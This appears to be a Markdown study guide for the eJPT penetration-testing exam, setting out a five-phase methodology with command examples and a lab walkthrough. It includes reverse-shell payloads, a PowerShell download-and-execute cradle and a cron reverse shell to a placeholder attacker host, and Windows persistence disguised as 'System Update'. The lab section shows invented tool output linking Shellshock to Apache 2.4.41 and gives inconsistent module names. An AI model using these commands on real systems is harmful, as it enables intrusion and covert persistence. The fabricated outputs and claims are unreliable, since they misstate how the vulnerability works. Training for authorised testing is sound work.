# 🎯 eJPT Methodology - Complete Penetration Testing Framework

A comprehensive methodology guide covering the systematic approach to penetration testing with focus on eJPT exam requirements and real-world application.

**Location:** `01-theory-foundations/ejpt-methodology.md`

## 🎯 What is eJPT Methodology?

The eJPT (eLearnSecurity Junior Penetration Tester) methodology is a structured approach to penetration testing that follows industry-standard phases while maintaining simplicity and effectiveness. This methodology emphasizes practical skills over theoretical knowledge and focuses on real-world scenarios that junior penetration testers encounter.

The eJPT methodology consists of **5 core phases**:
- **Information Gathering** - Reconnaissance and intelligence collection
- **Assessment** - Vulnerability identification and analysis  
- **Exploitation** - Active exploitation of discovered vulnerabilities
- **Post-Exploitation** - Maintaining access and privilege escalation
- **Reporting** - Documentation and communication of findings

## 📦 Methodology Framework Overview

### The Complete eJPT Testing Cycle:
```bash
# Phase 1: Information Gathering (20% of exam)
reconnaissance → passive_scanning → active_scanning → service_enumeration

# Phase 2: Assessment (25% of exam)
vulnerability_identification → risk_assessment → exploit_research

# Phase 3: Exploitation (35% of exam)
exploit_execution → shell_access → payload_delivery

# Phase 4: Post-Exploitation (15% of exam)
privilege_escalation → persistence → lateral_movement → data_extraction

# Phase 5: Reporting (5% of exam)
evidence_collection → findings_documentation → recommendations
```

## 🔧 Phase 1: Information Gathering

### 🎯 Objectives:
- Identify target systems and services
- Map network topology and architecture
- Collect technical and business intelligence
- Build comprehensive target profile

### 📊 Information Gathering Workflow:

#### Step 1: Passive Reconnaissance (OSINT)
```bash
# Domain and subdomain discovery
google dorking techniques
whois domain_name
dig domain_name
dnsrecon -d domain_name

# Social media and public information
shodan searches
linkedin reconnaissance
company website analysis
```

#### Step 2: Active Reconnaissance  
```bash
# Network discovery
nmap -sn target_network/24
arp-scan -l
netdiscover -r target_network/24

# Port scanning
nmap -sS -O -sV -p- target_ip
nmap -sC -sV -p22,80,443 target_ip
```

#### Step 3: Service Enumeration
```bash
# HTTP/HTTPS enumeration
nikto -h http://target_ip
dirb http://target_ip
gobuster dir -u http://target_ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# SMB enumeration
smbclient -L \\target_ip
enum4linux target_ip
smbmap -H target_ip

# SSH enumeration
ssh target_ip
ssh-audit target_ip
```

### 📋 Phase 1 Deliverables:
- Network topology map
- Open ports and services inventory
- Technology stack identification
- Potential attack vectors list

## 🔧 Phase 2: Assessment and Vulnerability Analysis

### 🎯 Objectives:
- Identify security vulnerabilities
- Assess vulnerability impact and likelihood
- Research available exploits
- Prioritize attack vectors

### 📊 Assessment Workflow:

#### Step 1: Automated Vulnerability Scanning
```bash
# Network vulnerability scanning
nmap --script vuln target_ip
nmap --script=smb-vuln* target_ip

# Web application scanning
nikto -h http://target_ip -C all
wpscan --url http://target_ip --enumerate ap,at,cb,dbe
```

#### Step 2: Manual Vulnerability Testing
```bash
# Manual service testing
telnet target_ip port
nc -nv target_ip port

# Web application manual testing
curl -X OPTIONS http://target_ip
curl -I http://target_ip
whatweb http://target_ip
```

#### Step 3: Exploit Research
```bash
# CVE and exploit database research
searchsploit service_name version
msfconsole -q -x "search cve:2021"
exploit-db searches
```

### 📋 Phase 2 Deliverables:
- Vulnerability assessment report
- Risk rating matrix
- Exploit availability confirmation
- Attack path analysis

## 🔧 Phase 3: Exploitation

### 🎯 Objectives:
- Gain initial access to target systems
- Exploit identified vulnerabilities
- Establish persistent access
- Demonstrate security impact

### 📊 Exploitation Workflow:

#### Step 1: Initial Access
```bash
# Metasploit exploitation
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST attacker_ip
set LPORT 4444
exploit

# Manual exploitation
python3 exploit.py target_ip
nc -nlvp 4444
```

#### Step 2: Shell Stabilization
```bash
# Linux shell upgrade
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo; fg

# Windows shell techniques
powershell -c "IEX(New-Object Net.WebClient).downloadString('http://attacker_ip/shell.ps1')"
```

#### Step 3: Payload Generation and Delivery
```bash
# MSFvenom payload generation
msfvenom -p linux/x86/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f elf > shell.elf
msfvenom -p windows/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > shell.exe

# File transfer methods
python3 -m http.server 8080
wget http://attacker_ip:8080/shell.elf
curl -O http://attacker_ip:8080/shell.exe
```

### 📋 Phase 3 Deliverables:
- Successful exploitation proof
- Shell access screenshots
- Payload delivery confirmation
- Initial foothold documentation

## 🔧 Phase 4: Post-Exploitation

### 🎯 Objectives:
- Escalate privileges to administrator/root
- Maintain persistent access
- Perform lateral movement
- Extract sensitive data

### 📊 Post-Exploitation Workflow:

#### Step 1: Privilege Escalation
```bash
# Linux privilege escalation
find / -perm -4000 2>/dev/null
/usr/bin/find . -exec /bin/sh \; -quit
sudo -l

# Windows privilege escalation
whoami /priv
systeminfo
net user
wmic qfe get Description,HotFixID,InstalledOn
```

#### Step 2: Persistence Mechanisms
```bash
# Linux persistence
crontab -e
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'" | crontab -

# Windows persistence
schtasks /create /tn "System Update" /tr "C:\temp\shell.exe" /sc onlogon
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "C:\temp\shell.exe"
```

#### Step 3: Lateral Movement
```bash
# Network reconnaissance from compromised host
arp -a
netstat -rn
ps aux | grep -i network

# Internal network scanning
nmap -sn internal_network/24
./nmap -p 22,135,139,445 internal_targets
```

#### Step 4: Data Extraction
```bash
# Sensitive file discovery
find / -name "*.conf" 2>/dev/null
find / -name "passwd" 2>/dev/null
find / -name "*.db" 2>/dev/null

# Database extraction
mysqldump -u root -p database_name > dump.sql
sqlite3 database.db ".dump" > database_dump.sql
```

### 📋 Phase 4 Deliverables:
- Privilege escalation proof
- Persistence mechanism documentation
- Network mapping from inside
- Extracted sensitive data inventory

## 🔧 Phase 5: Reporting and Documentation

### 🎯 Objectives:
- Document all findings comprehensively
- Provide clear remediation recommendations
- Create executive and technical reports
- Ensure compliance with testing scope

### 📊 Reporting Workflow:

#### Step 1: Evidence Organization
```bash
# Screenshot organization
mkdir -p evidence/{reconnaissance,exploitation,post-exploitation}
cp *.png evidence/exploitation/
cp *.txt evidence/reconnaissance/

# Command history preservation
history > command_history.txt
cat ~/.bash_history > bash_commands.txt
```

#### Step 2: Finding Classification
```bash
# Severity rating system
Critical: Remote code execution, SQL injection
High: Local privilege escalation, sensitive data exposure  
Medium: Information disclosure, weak authentication
Low: Minor configuration issues, informational findings
```

#### Step 3: Report Structure
```markdown
## Executive Summary
- Testing objectives and scope
- Key findings summary
- Business risk assessment
- High-level recommendations

## Technical Findings
### Finding 1: [Vulnerability Name]
- **Severity:** Critical/High/Medium/Low
- **Description:** Detailed vulnerability description
- **Impact:** Business and technical impact
- **Evidence:** Screenshots and proof of concept
- **Recommendation:** Specific remediation steps

## Remediation Timeline
- Critical: Immediate (0-7 days)
- High: Short-term (1-4 weeks)  
- Medium: Medium-term (1-3 months)
- Low: Long-term (3+ months)
```

### 📋 Phase 5 Deliverables:
- Complete penetration test report
- Executive summary presentation
- Technical remediation guide
- Evidence package with screenshots

## 🎯 eJPT Exam Focus

### Essential Skills for eJPT (Importance Distribution):
- **Information Gathering (20%):** Network discovery, port scanning, service enumeration
- **Assessment (25%):** Vulnerability identification, manual testing techniques
- **Exploitation (35%):** Metasploit usage, manual exploitation, shell access
- **Post-Exploitation (15%):** Privilege escalation, file transfer, persistence
- **Reporting (5%):** Evidence collection, finding documentation

### Critical Commands to Master:
```bash
# Network discovery and enumeration (25% of exam)
nmap -sn network/24                    # Host discovery
nmap -sC -sV -p- target_ip            # Comprehensive port scan
enum4linux target_ip                   # SMB enumeration
dirb http://target_ip                  # Directory enumeration

# Exploitation and shells (40% of exam)  
msfconsole                             # Metasploit framework
msfvenom -p payload LHOST=ip LPORT=port # Payload generation
nc -nlvp port                          # Netcat listener
python -c 'import pty; pty.spawn("/bin/bash")' # Shell upgrade

# File transfer and post-exploitation (20% of exam)
python3 -m http.server 8080           # HTTP file server
wget http://attacker_ip:8080/file     # Download files
find / -perm -4000 2>/dev/null        # SUID binary discovery
sudo -l                               # Sudo permissions check

# Database and web exploitation (15% of exam)
sqlmap -u "http://target/page?id=1"   # SQL injection testing
gobuster dir -u http://target -w wordlist # Directory brute force
hydra -L users -P passwords target service # Password attacks
```

### eJPT Exam Scenarios:

1. **Network Penetration Scenario (60% probability):**
   - Required skills: Network scanning, service enumeration, exploitation
   - Expected commands: nmap, enum4linux, smbclient, metasploit
   - Success criteria: Gain shell access and escalate privileges

2. **Web Application Testing Scenario (40% probability):**
   - Required skills: Web enumeration, SQL injection, file upload
   - Expected commands: dirb, sqlmap, burpsuite, nikto
   - Success criteria: Exploit web vulnerabilities and access database

### Exam Tips and Tricks:
- **Time Management:** Spend 30% on enumeration, 50% on exploitation, 20% on reporting
- **Documentation:** Screenshot every successful command and finding
- **Methodology:** Follow the 5-phase approach systematically
- **Common Pitfalls:** Don't skip enumeration, always upgrade shells, document everything
- **Lab Practice:** Practice on HackTheBox, TryHackMe, and VulnHub machines

### Common eJPT Question Patterns:
- **Scenario-based questions:** Given a network range, identify and exploit vulnerabilities
- **Tool usage questions:** Demonstrate proper use of nmap, metasploit, and enumeration tools  
- **Report writing:** Document findings with proper severity ratings and recommendations
- **Methodology questions:** Explain the systematic approach to penetration testing

## ⚠️ Common Issues & Troubleshooting

### Issue 1: Enumeration Phase Taking Too Long
**Problem:** Spending excessive time on information gathering without finding exploitable services
**Cause:** Lack of systematic approach or getting stuck on rabbit holes
**Solution:**
```bash
# Set time limits for each enumeration phase
# Focus on common services first
nmap -sC -sV -p 21,22,23,25,53,80,110,111,135,139,143,443,993,995,1723,3306,3389,5432,5900 target_ip

# Move to exploitation after 30 minutes of enumeration
timeout 1800 enum4linux target_ip
```

### Issue 2: Exploitation Attempts Failing
**Problem:** Known exploits not working despite vulnerable service versions
**Cause:** Exploit compatibility issues, incorrect parameters, or missing dependencies
**Solution:**
```bash
# Verify exploit compatibility
searchsploit -x exploit_path
cat exploit.py | grep -i "usage\|example"

# Test exploit manually before using in framework
python3 exploit.py --help
python3 exploit.py target_ip 80 test
```

### Issue 3: Shell Connectivity Issues
**Problem:** Getting shells that immediately disconnect or are unstable
**Cause:** Firewall interference, incorrect payload, or network instability
**Solution:**
```bash
# Test different payloads and ports
msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f elf > bind_shell.elf
msfvenom -p linux/x86/shell_reverse_tcp LHOST=attacker_ip LPORT=443 -f elf > reverse_shell.elf

# Stabilize shell immediately after connection
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
stty raw -echo; fg
```

### Issue 4: Privilege Escalation Roadblocks
**Problem:** Unable to escalate privileges despite successful initial exploitation
**Cause:** Limited enumeration of escalation vectors or missing obvious opportunities
**Solution:**
```bash
# Systematic privilege escalation enumeration
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
find / -perm -4000 2>/dev/null | head -20
sudo -l 2>/dev/null
cat /etc/crontab 2>/dev/null
```

## 🔗 Integration with Other Tools

### Primary Integration: Information Gathering → Assessment → Exploitation
```bash
# Complete workflow showing tool integration
nmap -sC -sV target_ip | tee nmap_results.txt
searchsploit apache 2.4.41 | grep -i "remote"
msfconsole -q -x "use exploit/linux/http/apache_mod_cgi_bash_env_exec; set RHOSTS target_ip; exploit"

# Explanation of each step
# Step 1: Nmap identifies Apache 2.4.41 running on port 80
# Step 2: Searchsploit finds relevant exploits for this version  
# Step 3: Metasploit exploits the vulnerability automatically
```

### Secondary Integration: Manual Testing → Automated Exploitation
```bash
# Manual verification before automated tools
curl -I http://target_ip/cgi-bin/test.cgi
echo "() { :; }; echo vulnerable" | nc target_ip 80

# Automated exploitation after manual confirmation
python3 shellshock_exploit.py target_ip 80 /cgi-bin/test.cgi
```

### Advanced Workflows:
```bash
# Complex multi-phase engagement
## Phase 1: Reconnaissance
nmap -sn target_network/24 > live_hosts.txt
masscan -p1-65535 $(cat live_hosts.txt) --rate=1000 > open_ports.txt

## Phase 2: Enumeration  
while read host port; do nmap -sC -sV -p$port $host; done < open_ports.txt > detailed_scan.txt

## Phase 3: Exploitation
cat detailed_scan.txt | grep -i "apache\|nginx\|ssh\|smb" | while read service; do 
  searchsploit $service | grep -i "remote"
done > potential_exploits.txt
```

## 📝 Documentation and Reporting

### Evidence Collection Requirements:
1. **Screenshots:** 
   - Every successful exploit attempt
   - Privilege escalation proof
   - Sensitive data access
   - Command execution evidence

2. **Command Outputs:** 
   - All nmap scan results
   - Service enumeration outputs
   - Exploit execution logs
   - Post-exploitation command results

3. **Log Files:** 
   - Metasploit console logs
   - Web server access logs (if available)
   - System authentication logs
   - Network traffic captures

4. **Configuration Files:** 
   - Retrieved configuration files
   - Database connection strings
   - Service configuration details
   - User account information

### Report Template Structure:
```markdown
# Penetration Test Report

## Executive Summary
- **Testing Period:** Start_date - End_date
- **Testing Methodology:** eJPT 5-phase approach
- **Scope:** IP ranges and systems tested
- **Key Findings:** X Critical, Y High, Z Medium vulnerabilities
- **Business Risk:** Overall risk assessment
- **Recommendations:** Priority actions required

## Technical Summary

### Network Architecture
- Network topology diagram
- Identified systems and services
- Technology stack analysis

### Vulnerability Summary
| Severity | Count | Description |
|----------|-------|-------------|
| Critical | X | Remote code execution, SQL injection |
| High | Y | Privilege escalation, authentication bypass |
| Medium | Z | Information disclosure, weak encryption |
| Low | A | Minor configuration issues |

### Detailed Findings

#### Finding 1: Remote Code Execution via Apache Shellshock
- **Severity:** Critical
- **CVSS Score:** 10.0
- **Affected Systems:** 192.168.1.100:80
- **Description:** The Apache web server is vulnerable to CVE-2014-6271 (Shellshock)
- **Impact:** Complete system compromise possible
- **Proof of Concept:**
```bash
curl -H "User-Agent: () { :; }; echo; /bin/id" http://192.168.1.100/cgi-bin/test.cgi
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
- **Evidence:** [Screenshot: shellshock_exploit.png]
- **Recommendation:** Update bash to version 4.3.30 or later immediately

### Remediation Timeline
- **Critical (0-7 days):** Patch Shellshock vulnerability, disable unnecessary services
- **High (1-4 weeks):** Implement network segmentation, update SSH configurations  
- **Medium (1-3 months):** Review file permissions, implement monitoring
- **Low (3+ months):** Documentation updates, policy reviews

## Appendices
- **Appendix A:** Complete nmap scan results
- **Appendix B:** Exploit code and payloads used
- **Appendix C:** Screenshots and evidence files
- **Appendix D:** Tool versions and testing environment
```

### Automation Scripts:
```bash
# Evidence collection automation
#!/bin/bash
REPORT_DIR="ejpt_report_$(date +%Y%m%d)"
mkdir -p $REPORT_DIR/{screenshots,logs,evidence,exploits}

# Collect command history
history > $REPORT_DIR/logs/command_history.txt
cat ~/.bash_history > $REPORT_DIR/logs/bash_history.txt

# Organize screenshots by phase
mv reconnaissance_*.png $REPORT_DIR/screenshots/
mv exploitation_*.png $REPORT_DIR/screenshots/
mv post_exploitation_*.png $REPORT_DIR/screenshots/

# Generate summary report
echo "eJPT Penetration Test - $(date)" > $REPORT_DIR/summary.txt
echo "Target Network: $TARGET_NETWORK" >> $REPORT_DIR/summary.txt
echo "Testing Duration: $(cat $REPORT_DIR/logs/command_history.txt | head -1) to $(date)" >> $REPORT_DIR/summary.txt
```

## 🧪 Real Lab Example: Complete eJPT Methodology

### Lab Scenario: Corporate Network Penetration Test
```bash
# Phase 1: Information Gathering (Target: 10.10.10.0/24)
nmap -sn 10.10.10.0/24
# Output: Host 10.10.10.5 is up (0.00050s latency)

nmap -sC -sV -p- 10.10.10.5
# Output: 22/tcp open ssh OpenSSH 7.4, 80/tcp open http Apache 2.4.41

# Phase 2: Assessment
searchsploit apache 2.4.41
# Output: Apache 2.4.41 - Shellshock Command Injection

curl -H "User-Agent: () { :; }; echo vulnerable" http://10.10.10.5/cgi-bin/test.cgi
# Output: vulnerable

# Phase 3: Exploitation  
msfconsole -q -x "use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOSTS 10.10.10.5; set TARGETURI /cgi-bin/test.cgi; set LHOST 10.10.14.15; exploit"
# Output: [+] Command shell session 1 opened

# Phase 4: Post-Exploitation
python -c 'import pty; pty.spawn("/bin/bash")'
find / -perm -4000 2>/dev/null | head -5
# Output: /usr/bin/passwd, /usr/bin/sudo, /bin/su

sudo -l
# Output: User may run (ALL : ALL) ALL

sudo su -
# Output: root@target:~#

# Phase 5: Documentation
echo "Successfully exploited CVE-2014-6271 and escalated to root" > findings.txt
screenshot exploitation_proof.png
```

## 📚 Additional Resources

### Official Documentation:
- eLearnSecurity eJPT Official Guide: https://elearnsecurity.com/product/ejpt-certification/
- NIST SP 800-115 Technical Guide to Information Security Testing: https://csrc.nist.gov/publications/detail/sp/800-115/final
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/

### Learning Resources:
- eJPT Practice Labs: INE Starter Pass penetration testing labs
- TryHackMe eJPT Preparation: https://tryhackme.com/path/outline/ejpt
- HackTheBox Starting Point: https://www.hackthebox.com/starting-point

### Community Resources:
- eJPT Reddit Community: https://reddit.com/r/eLearnSecurity
- Discord eJPT Study Groups: Search for "eJPT" in cybersecurity Discord servers
- InfoSec Twitter: Follow @elearnsecurity and #eJPT hashtag

### Related Methodologies:
- PTES (Penetration Testing Execution Standard): More comprehensive enterprise methodology
- OSSTMM (Open Source Security Testing Methodology Manual): Academic research-focused approach
- NIST SP 800-115: Government and compliance-focused testing methodology
